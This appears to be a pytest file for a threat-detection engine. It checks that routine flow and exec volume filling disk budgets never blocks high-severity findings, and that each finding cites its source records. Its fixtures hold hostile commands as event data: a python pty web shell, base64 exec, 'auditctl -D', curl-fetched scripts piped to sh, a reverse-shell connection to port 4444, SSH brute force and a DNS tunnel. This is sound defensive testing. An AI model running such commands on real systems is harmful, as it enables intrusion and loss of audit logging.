"""A full store never starves another. Every store has a guaranteed floor of the hunt's disk budget and shares the
rest by need, so routine volume (flows, joins, exec history) can spend only its own floors and the shared headroom.
A store in no-growth mode keeps its rule reading every record: matches that need no new state still publish, a
strong per-record item that has no room for its group publishes on its own (citing every record it states), a join
whose inputs are already held is still judged, and only records needing new state are refused (coverage partial,
the reason named). At finalize, a rule that cannot get disk publishes its per-record items from what is readable."""
from datetime import UTC, datetime, timedelta

from romulus.detect import dns, flows, network, tamper
from romulus.detect.auth import AccountOrGroupChange, SshSuccessAfterFailures
from romulus.detect.base import Playbook
from romulus.detect.bounded import KeyedStore, SpillList, StateBudget, live_stores
from romulus.detect.correlation import InterpreterExternalConnection, ProcessNetworkLink
from romulus.detect.host import DownloaderFeedsInterpreter, WebServiceSpawnsInterpreter, alone, share_lineage
from romulus.detect.indicators import Indicator, IndicatorMatch, IndicatorSet
from romulus.detect.lineage import ReverseShellByLineage
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt import sweep as sw
from romulus.hunt.stage import EventStage
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

T0 = datetime(2030, 4, 2, 8, 0, tzinfo=UTC)
EXT = "203.0.113.9"
_n = 0


def ev(family, ts, host="app01", outcome=Outcome.success, **fields) -> TypedEvent:
    """A fixture record whose every field's origin names the record: `<event id>:<field>`."""
    global _n
    _n += 1
    eid = f"sv{_n:07d}"
    return TypedEvent(id=eid, family=family, ts=ts, host=host, outcome=outcome,
                      fields={k.replace("__", "."): fv(v, f"{eid}:{k}") for k, v in fields.items() if v is not None},
                      raw=[RawRef(target="fx", native_id=eid)], normalizer="fixture")


def flow(i: int, ts) -> TypedEvent:
    """Routine volume: one flow per (source, destination) pair, each a new port-scan group and new join rows."""
    return ev("net_flow", ts, host="sensor", source__ip=f"10.{i // 250 % 250}.{i % 250}.1", source__port=40000,
              destination__ip=f"172.16.{i // 250 % 250}.{i % 250}", destination__port=443)


def web_shell(ts, argv=("/usr/bin/python3", "-c", "import pty;pty.spawn('/bin/bash')")) -> TypedEvent:
    return ev("process_exec", ts, host="web01", process__argv=list(argv), process__user="www-data",
              process__executable=argv[0], process__pid=900)


def web_rare(ts, i) -> TypedEvent:
    """A web-service interpreter run without a typed indicator: judged by its shape's rarity (grouping state)."""
    return ev("process_exec", ts, host="web01", process__argv=["/bin/sh", "-c", f"/usr/bin/tool{i} -m 1"],
              process__user="www-data", process__executable="/bin/dash", process__pid=950 + i)


LISTED = IndicatorSet([
    Indicator(id="C2-DOM", kind="domain", values=("c2.test",), label="test C2 domain", severity="high", lane="high",
              source="unit"),
])


class _Listed(IndicatorMatch):
    def __init__(self):
        super().__init__(LISTED)


def query(ts, name) -> TypedEvent:
    return ev("dns_query", ts, host="sensor", source__ip="10.0.0.5", dns__question__name=name)


def delete_rules(ts, pid=7004) -> TypedEvent:
    return ev("process_exec", ts, host="node7", process__argv=["auditctl", "-D"],
              process__executable="/usr/sbin/auditctl", process__uid="0", process__user="root", process__pid=pid,
              process__ppid=7000, process__cwd="/root")


def reverse_shell(ts) -> list[TypedEvent]:
    """A www-data python connects out, then re-execs a shell in the same pid."""
    return [*reverse_shell_connect(ts), reverse_shell_exec(ts + timedelta(seconds=2))]


def reverse_shell_connect(ts) -> list[TypedEvent]:
    return [ev("process_exec", ts, process__executable="/usr/bin/python3", process__pid=500,
               process__argv=["/usr/bin/python3"], process__user="www-data"),
            ev("net_socket", ts + timedelta(seconds=1), socket__syscall="connect", process__pid=500,
               process__executable="/usr/bin/python3", process__user="www-data", destination__ip=EXT,
               destination__port=4444)]


def reverse_shell_exec(ts) -> TypedEvent:
    return ev("process_exec", ts, process__executable="/bin/bash", process__pid=500, process__argv=["/bin/bash"],
              process__user="www-data")


def downloader(ts) -> list[TypedEvent]:
    return [ev("process_exec", ts, host="web02", process__pid=801, process__ppid=800,
               process__executable="/usr/bin/curl", process__argv=["curl", "-s", "http://203.0.113.7/x.sh"]),
            ev("process_exec", ts + timedelta(seconds=1), host="web02", process__pid=802, process__ppid=800,
               process__executable="/bin/sh", process__argv=["sh"])]


def benign_exec(i, ts) -> TypedEvent:
    return ev("process_exec", ts, host=f"h{i % 500}", process__pid=10000 + i, process__ppid=1,
              process__executable="/usr/bin/true", process__argv=["/usr/bin/true", str(i)], process__user="root",
              process__uid="0")


def ssh(ts, outcome=Outcome.failure, port=40000, ip=EXT, user="root") -> TypedEvent:
    return ev("auth", ts, outcome=outcome, auth__service="sshd", auth__phase="authentication", source__ip=ip,
              source__port=port, auth__user_valid=True, auth__method="password", user__name=user)


def tunnel(ts, i) -> TypedEvent:
    """One question of a TXT tunnel: long random-looking labels under one registered domain."""
    import random
    rng = random.Random(i)
    hexes = "0123456789abcdef"
    name = f"{''.join(rng.choice(hexes) for _ in range(60))}.{''.join(rng.choice(hexes) for _ in range(30))}" \
           f".tun.example.test"
    return ev("dns_query", ts, host="sensor", source__ip="10.40.0.9", destination__ip="10.0.0.53",
              dns__type="query", dns__question__name=name, dns__question__type="TXT", network__transport="udp",
              suricata__flow_id=100000 + i)


def run_sweep(monkeypatch, tmp_path, pack, batches, budget):
    """The sweep over these batches with this budget, its floors planned for this pack; (published matches, rule
    cells). Each partition's fetch returns one raw record per event, and each published match carries the raw copies
    it was published with (`raw_sources_seen`)."""
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    now = datetime.now(UTC)
    feed, current = iter(batches), [[]]

    def execute(client, intent, contract):
        current[0] = next(feed)
        records = [{"_index": r.target, "_id": r.native_id, "_source": {"fixture": e.id}}
                   for e in current[0] for r in e.raw]
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                             completeness=Completeness.complete, total=len(records), total_relation="eq",
                             returned=len(records), records=records)
    monkeypatch.setattr(sw, "execute", execute)
    monkeypatch.setattr(sw, "normalize_hits", lambda records, boots: (current[0], {}, []))
    monkeypatch.setattr(sw, "state_budget", lambda settings, stage_dir: budget)
    published = []

    def publish(repo_, hunt, pb, m, task_id, raw_sources, *a, **k):
        m.raw_sources_seen = dict(raw_sources)
        published.append(m)
    monkeypatch.setattr(sw, "publish_match", publish)
    sweep = sw.Sweep(repo, object(), "h1", Window(start=T0, end=T0 + timedelta(hours=6)), {"romulus-host-x": None},
                     stage_dir=tmp_path)
    sweep.pack = pack
    for pb in pack:
        pb.spill_dir, pb.budget = tmp_path, budget
    budget.plan(live_stores(pack) + 1)
    for k in range(len(batches)):
        start = T0 + timedelta(minutes=10 * k)
        sweep.run_partition("romulus-host-x", None, [], Window(start=start, end=start + timedelta(minutes=10)), est=1)
    sweep.finalize()
    return published, repo.rule_cells("h1")


def _by_rule(published, rule_id):
    return [m for m in published if m.playbook_id == rule_id]


def _strong_batch(ts):
    return [web_shell(ts), query(ts + timedelta(seconds=1), "beacon.c2.test"),
            delete_rules(ts + timedelta(seconds=2)), *reverse_shell(ts + timedelta(seconds=3))]


def _pack(monkeypatch, routine_hot=1, strong_hot=None):
    monkeypatch.setattr(network.PortScan, "HOT", routine_hot)
    monkeypatch.setattr(network.PortScan, "REQUESTS_HOT", routine_hot)
    if strong_hot is not None:
        monkeypatch.setattr(_Listed, "HOT", strong_hot)
    return [network.PortScan(), WebServiceSpawnsInterpreter(), _Listed(), tamper.AuditRulesTamper(),
            ReverseShellByLineage()]


def _every_hot_set_at_one(monkeypatch):
    keyed, listed = KeyedStore.__init__, SpillList.__init__
    monkeypatch.setattr(KeyedStore, "__init__", lambda self, owner, name, hot, **kw: keyed(self, owner, name, 1, **kw))
    monkeypatch.setattr(SpillList, "__init__", lambda self, owner, name, hot, **kw: listed(self, owner, name, 1, **kw))


def _capped(cells, rule_id) -> int:
    return sum(c["detail"].get("state_capped") or 0 for c in cells if c["rule_id"] == rule_id and c["target"] != "*")


def _cites_what_it_states(published) -> None:
    """Every predicate of every published match comes from a cited record, and every cited record's raw copy was
    handed to publication (from the partition read, or from the event stage)."""
    for m in published:
        cited = {e.id for e in m.events}
        origins = {p.origin.split(":", 1)[0] for p in m.predicate}
        assert origins <= cited, (m.playbook_id, m.claim, origins - cited)
        for e in m.events:
            assert all(r.key in m.raw_sources_seen for r in e.raw), (m.playbook_id, e.id)


class _Switch(Playbook):
    """Forces stores into no-growth mode when it reads a marker record (a test hook, first in the pack)."""
    id = "test.switch"
    title = "test"
    families = ("process_exec", "net_socket", "auth", "dns_query", "net_flow")

    def __init__(self, marker: str, reason: str, where):
        super().__init__()
        self.marker, self.reason, self.where = marker, reason, where

    def consume(self, events):
        if any(e.id == self.marker for e in events):
            self.budget.force_full(self.reason, self.where)
        return []


# ---- routine volume spends only routine floors ---------------------------------------------------------------------
def test_routine_volume_spends_only_its_own_floors_and_strong_records_still_publish(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=400_000, reserve=0)
    flood = [[flow(5000 * b + i, T0 + timedelta(minutes=b, seconds=i % 60)) for i in range(5000)] for b in range(4)]
    later = _strong_batch(T0 + timedelta(hours=2))
    published, cells = run_sweep(monkeypatch, tmp_path, _pack(monkeypatch), [*flood, later], budget)
    # the port scan's stores went past their floors once the shared headroom was spent; no strong store did
    assert budget.full and all(name.startswith(network.PortScan.id) for name in budget.full)
    scan = [c for c in cells if c["rule_id"] == network.PortScan.id and c["target"] != "*"]
    assert any(c["state"] == "evaluated_partial" and c["detail"].get("state_capped") for c in scan)
    # every strong record read after the flood is found exactly as it would be with room
    [shell] = [m for m in _by_rule(published, WebServiceSpawnsInterpreter.id) if m.events[0].host == "web01"]
    assert shell.proposed_lane == "lead" and "|unheld" not in shell.group_key
    [ioc] = _by_rule(published, _Listed.id)
    assert ioc.proposed_lane == "high" and "beacon.c2.test" in ioc.claim and "|unheld" not in ioc.group_key
    [rules] = _by_rule(published, tamper.AuditRulesTamper.id)
    assert "delete every audit rule (-D)" in rules.claim
    [reverse] = _by_rule(published, ReverseShellByLineage.id)
    assert reverse.proposed_lane == "high" and EXT in reverse.claim
    for rule_id in (_Listed.id, tamper.AuditRulesTamper.id, ReverseShellByLineage.id,
                    WebServiceSpawnsInterpreter.id):
        assert _capped(cells, rule_id) == 0
    _cites_what_it_states(published)


def test_sysmon_volume_cannot_spend_the_indicator_store_floor(monkeypatch, tmp_path):
    monkeypatch.setattr(_Listed, "HOT", 1)
    budget = StateBudget(tmp_path, disk_total=96 * 1024, reserve=0)
    rule = _Listed()
    rule.spill_dir, rule.budget = tmp_path, budget
    windows_account = budget.account("windows_seen")
    budget.plan(live_stores([rule]) + 1)
    stage = EventStage(tmp_path, budget=budget, windows_account=windows_account)
    flood = []
    for number in range(8_000):
        item = ev("process_exec" if number % 2 == 0 else "net_socket", T0, host=f"ws{number % 500}")
        item.id = f"windows-{number:08d}"
        item.normalizer = "windows-ecs@2"
        flood.append(item)

    stage.unique_windows(flood)

    windows_hit = query(T0 + timedelta(hours=1), "one.c2.test")
    windows_hit.host = "ws01"
    windows_hit.normalizer = "windows-ecs@2"
    linux_hit = query(T0 + timedelta(hours=1, seconds=1), "two.c2.test")
    linux_hit.host = "linux01"
    rule.consume([windows_hit, linux_hit])
    cited = rule.drain_staged()
    stage.put(cited, {})
    rule.bind_loader(stage.load)
    findings = rule.finalize()

    assert stage.windows_refused > 0
    assert set(budget.full) == {"windows_seen"}
    assert len(findings) == 2
    assert {finding.events[0].host for finding in findings} == {"ws01", "linux01"}
    assert not rule.limits
    rule.release_state()
    stage.close()


def _probe_pack():
    pack = [WebServiceSpawnsInterpreter(), DownloaderFeedsInterpreter(), _Listed(), tamper.AuditRulesTamper(),
            ReverseShellByLineage(), InterpreterExternalConnection(), AccountOrGroupChange()]
    share_lineage(pack)
    return pack


def test_forty_thousand_benign_execs_never_starve_a_strong_event_every_hot_set_at_one(monkeypatch, tmp_path):
    """The reviewer's probe: routine exec volume fills the one shared exec store; every strong event read afterwards
    still publishes, the reverse shell included, and only the exec store is in no-growth mode."""
    _every_hot_set_at_one(monkeypatch)
    budget = StateBudget(tmp_path, disk_total=4_000_000, reserve=0)
    pack = _probe_pack()
    flood = [[benign_exec(4000 * b + i, T0 + timedelta(minutes=b, seconds=i % 60)) for i in range(4000)]
             for b in range(10)]
    later = _strong_batch(T0 + timedelta(hours=2)) + downloader(T0 + timedelta(hours=2, minutes=1))
    published, cells = run_sweep(monkeypatch, tmp_path, pack, [*flood, later], budget)
    lineage = pack[3].lineage.records
    assert set(budget.full) == {lineage.account().name}          # the exec store, and no other store, is full
    assert "lineage" in pack[3].limits                            # and its rules say their lineage is incomplete
    shells = [m for m in _by_rule(published, WebServiceSpawnsInterpreter.id) if m.events[0].host == "web01"]
    assert shells
    [ioc] = _by_rule(published, _Listed.id)
    assert ioc.proposed_lane == "high"
    [rules] = _by_rule(published, tamper.AuditRulesTamper.id)
    assert "delete every audit rule (-D)" in rules.claim
    [reverse] = _by_rule(published, ReverseShellByLineage.id)
    assert reverse.proposed_lane == "high" and EXT in reverse.claim
    assert _by_rule(published, InterpreterExternalConnection.id)
    [pair] = _by_rule(published, DownloaderFeedsInterpreter.id)
    assert pair.proposed_lane == "urgent"
    for pb in pack:
        assert _capped(cells, pb.id) == 0, pb.id
    _cites_what_it_states(published)


def test_a_routine_join_flood_never_starves_ssh_success_after_failures_or_the_dns_tunnel(monkeypatch, tmp_path):
    monkeypatch.setattr(network.PortScan, "HOT", 1)
    monkeypatch.setattr(network.PortScan, "REQUESTS_HOT", 1)
    monkeypatch.setattr(flows.HorizontalSweep, "HOT_GROUPS", 1)
    monkeypatch.setattr(flows.HorizontalSweep, "HOT_DESTINATIONS", 1)
    budget = StateBudget(tmp_path, disk_total=2_000_000, reserve=0)
    pack = [ProcessNetworkLink(), network.PortScan(), flows.HorizontalSweep(), SshSuccessAfterFailures(),
            dns.DnsTunnelShape()]
    flood = [[flow(5000 * b + i, T0 + timedelta(minutes=b, seconds=i % 60)) for i in range(5000)] for b in range(4)]
    later = T0 + timedelta(hours=2)
    attack = [ssh(later + timedelta(seconds=10 * i), port=41000 + i) for i in range(6)]
    attack.append(ssh(later + timedelta(minutes=2), Outcome.success, port=42000))
    attack += [tunnel(later + timedelta(minutes=3, seconds=i), i) for i in range(400)]
    settle = [ssh(later + timedelta(hours=2), Outcome.success, port=43000, ip="198.51.100.1", user="ops")]
    published, cells = run_sweep(monkeypatch, tmp_path, pack, [*flood, attack, settle], budget)
    routine = (ProcessNetworkLink.id, network.PortScan.id, flows.HorizontalSweep.id, "event_stage")
    assert budget.full and all(name.startswith(routine) for name in budget.full)
    assert _capped(cells, ProcessNetworkLink.id) or _capped(cells, network.PortScan.id)
    [login] = _by_rule(published, SshSuccessAfterFailures.id)
    assert login.proposed_lane == "high" and EXT in login.claim
    [shape] = _by_rule(published, dns.DnsTunnelShape.id)
    assert "tun.example.test" in shape.claim or "example.test" in shape.group_key
    assert _capped(cells, SshSuccessAfterFailures.id) == 0 and _capped(cells, dns.DnsTunnelShape.id) == 0
    _cites_what_it_states(published)


# ---- a strong store itself in no-growth mode ---------------------------------------------------------------------
def test_with_strong_stores_full_direct_matches_publish_and_joins_on_held_state_are_judged(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    ts = T0 + timedelta(hours=1)
    held = reverse_shell_connect(ts)                       # the connection is held while there is room
    marker = ev("process_exec", ts + timedelta(minutes=10), host="none", process__pid=1,
                process__executable="/usr/bin/true", process__argv=["/usr/bin/true"])
    switch = _Switch(marker.id, "strong stores forced full (test)", lambda account: account.strong)
    shell = web_shell(ts + timedelta(minutes=11), ("/usr/bin/python3", "-c",
                                                   "import base64;exec(base64.b64decode('aWQ='))"))
    later = [marker, *_strong_batch(ts + timedelta(minutes=10, seconds=1))[:3],
             reverse_shell_exec(ts + timedelta(minutes=10, seconds=5)), shell,
             web_rare(ts + timedelta(minutes=11, seconds=10), 1), web_rare(ts + timedelta(minutes=11, seconds=11), 1),
             query(ts + timedelta(minutes=11, seconds=12), "again.c2.test")]
    pack = [switch, *_pack(monkeypatch)]
    published, cells = run_sweep(monkeypatch, tmp_path, pack, [held, later], budget)
    web = [m for m in _by_rule(published, WebServiceSpawnsInterpreter.id) if m.events[0].host == "web01"]
    # a direct match needs no state: published as with room, at its own lane
    [direct] = [m for m in web if shell.id in {e.id for e in m.events}]
    assert direct.proposed_lane == "urgent" and "|unheld" not in direct.group_key
    # a run judged by its shape's rarity cannot be counted: one lead per shape, however many runs
    assert len([m for m in web if m.group_key.endswith("|unheld") and "tool1" in m.claim]) == 1
    # an indicator hit and a tamper command have no room for a group: each group publishes from its first record
    [ioc] = _by_rule(published, _Listed.id)
    assert ioc.group_key.endswith("|unheld") and ioc.proposed_lane == "high" and len(ioc.events) == 1
    [rules] = _by_rule(published, tamper.AuditRulesTamper.id)
    assert rules.group_key.endswith("|unheld") and "delete every audit rule (-D)" in rules.claim
    # the shell cannot be recorded, but its connection is held: the join is judged and published
    [reverse] = _by_rule(published, ReverseShellByLineage.id)
    assert reverse.proposed_lane == "high" and EXT in reverse.claim
    assert any("judged when it was read" in n for n in reverse.notes)
    assert _capped(cells, ReverseShellByLineage.id) == 0
    window = next(c for c in cells if c["rule_id"] == ReverseShellByLineage.id and c["target"] == "*")
    assert window["state"] in ("match_on_partial", "evaluated_partial", "positive_only_partial")
    # a new indicator value's grouping was refused through the rule's own path, and coverage names the store
    window = next(c for c in cells if c["rule_id"] == _Listed.id and c["target"] == "*")
    assert any("forced full" in r for r in window["detail"]["reasons"])
    _cites_what_it_states(published)


def test_a_shell_whose_connection_is_not_held_is_judged_and_said_to_be_partial(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    budget.force_full("strong stores forced full (test)", lambda account: account.strong)
    published, cells = run_sweep(monkeypatch, tmp_path, [ReverseShellByLineage()],
                                 [reverse_shell(T0 + timedelta(hours=1))], budget)
    # the connection could not be held, so the shell has nothing held to join: nothing is published, nothing is
    # claimed absent, and coverage says why
    assert _by_rule(published, ReverseShellByLineage.id) == []
    window = next(c for c in cells if c["rule_id"] == ReverseShellByLineage.id and c["target"] == "*")
    assert window["state"] != "no_match_complete"
    assert any("forced full" in r for r in window["detail"]["reasons"])


def test_a_login_after_held_failures_is_judged_when_its_finding_cannot_be_held(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    ts = T0 + timedelta(hours=1)
    failures = [ssh(ts + timedelta(seconds=10 * i), port=41000 + i) for i in range(6)]
    success = ssh(ts + timedelta(minutes=12), Outcome.success, port=42000)
    switch = _Switch(success.id, "logins forced full (test)",            # the found logins only: failures held
                     lambda account: account.name == f"{SshSuccessAfterFailures.id}:ssh_after_found")
    settle = [ssh(ts + timedelta(hours=2), Outcome.success, port=43000, ip="198.51.100.1", user="ops")]
    published, cells = run_sweep(monkeypatch, tmp_path, [switch, SshSuccessAfterFailures()],
                                 [failures, [success], settle], budget)
    [login] = _by_rule(published, SshSuccessAfterFailures.id)
    assert login.proposed_lane == "high" and login.group_key.endswith("|unheld")
    assert {e.id for e in failures} <= {e.id for e in login.events}         # the held failures are cited
    assert _capped(cells, SshSuccessAfterFailures.id) == 0
    _cites_what_it_states(published)


# ---- unheld findings cite what they state --------------------------------------------------------------------------
def test_an_unheld_finding_cites_the_earlier_partitions_record_it_states(monkeypatch, tmp_path):
    """The reviewer's probe: the downloader exec is read in one partition, the interpreter in the next, and the pair
    has no room: the finding cites both (the earlier one from the event stage), and every predicate is cited."""
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    budget.force_full("strong stores forced full (test)", lambda account: account.strong)
    curl, sh = downloader(T0 + timedelta(minutes=9, seconds=59))
    published, _cells = run_sweep(monkeypatch, tmp_path, [DownloaderFeedsInterpreter()], [[curl], [sh]], budget)
    [m] = _by_rule(published, DownloaderFeedsInterpreter.id)
    assert {e.id for e in m.events} == {curl.id, sh.id} and m.proposed_lane == "urgent"
    assert "http://203.0.113.7/x.sh" in m.claim and "(not cited)" not in m.claim
    _cites_what_it_states(published)


def test_a_record_that_cannot_be_cited_is_not_stated_as_cited(monkeypatch, tmp_path):
    """When the event stage could not take a rule's citations, an earlier record is dropped from the finding, its
    predicates go with it, and the claim says so in its own text."""
    from romulus.detect.base import Match, pf
    rule = DownloaderFeedsInterpreter()
    curl, sh = downloader(T0)
    rule.note_limit("stage", "the event stage could not take this partition's citations (test)")
    rule._batch = [sh]
    m = Match(rule.id, f"'{curl.get('process.argv')[-1]}' then 'sh'.", rule.claim_type, [curl, sh],
              [pf(curl, "process.argv"), pf(sh, "process.argv")], curl.ts, rule.severity, rule.lane, "medium", [],
              group_key="k")
    out = alone(m, rule, sh)
    assert [e.id for e in out.events] == [sh.id]
    assert [p.origin.split(":")[0] for p in out.predicate] == [sh.id]
    assert "(not cited)" in out.claim


def test_the_reviewer_probe_a_spent_hunt_budget_publishes_the_same_direct_matches(monkeypatch, tmp_path):
    def published_with(spent: bool, where):
        budget = StateBudget(where, disk_total=2**40, reserve=0)
        if spent:
            budget.over_total = "detector state on disk reached the hunt's budget (probe)"
        batch = [web_shell(T0), web_shell(T0 + timedelta(seconds=1), ("/bin/sh", "-c", "curl http://e/x | sh"))]
        published, _cells = run_sweep(monkeypatch, where, [WebServiceSpawnsInterpreter()], [batch], budget)
        return sorted((m.proposed_lane, m.severity, m.claim.split(" (argv")[0]) for m in published)
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    assert published_with(True, tmp_path / "a") == published_with(False, tmp_path / "b") != []


def test_finalize_without_disk_still_publishes_tamper_commands_and_held_indicator_groups(monkeypatch, tmp_path):
    from tests.test_bounded_hostrules_tamper_ioc import fleet_config
    monkeypatch.setattr(tamper.AuditRulesTamper, "HOT", 2)
    rule = tamper.AuditRulesTamper()
    rule.spill_dir = tmp_path / "t"
    rule.budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    stage = {}
    command = delete_rules(T0 + timedelta(hours=3))
    for part in ([fleet_config(T0 + timedelta(seconds=i), f"node{i}", i) for i in range(20)], [command]):
        rule.consume(part)
        stage.update({e.id: e for e in rule.drain_staged()})
    assert rule.configs.on_disk > 0
    rule.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    rule.budget.finalizing = True
    rule.budget.low_space = "the stage volume's free space is below the reserve (test)"
    out = sw.Sweep._finalize_rule(rule)                 # finalize needs disk to order the records: it falls back
    [m] = [m for m in out if command.id in {e.id for e in m.events}]
    assert "delete every audit rule (-D)" in m.claim and any("linking them needed disk" in n for n in m.notes)
    assert any("finalize stopped" in r for r in rule.limit_reasons())
    rule.close_spill()

    monkeypatch.setattr(_Listed, "HOT", 1)
    ioc = _Listed()
    ioc.spill_dir = tmp_path / "i"
    ioc.budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    stage = {}
    for k in range(3):
        ioc.consume([query(T0 + timedelta(minutes=k), f"x{k}.c2.test")])
        stage.update({e.id: e for e in ioc.drain_staged()})
    ioc.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    ioc.groups.broken = ioc.budget.broken = "writing detector state failed (test)"
    out = sw.Sweep._finalize_rule(ioc)                  # the table on disk cannot be read: memory only
    assert [m.group_key.split("|")[3] for m in out] == ["x2.c2.test"]
    assert any("published from memory only" in n for n in out[0].notes)
    ioc.close_spill()
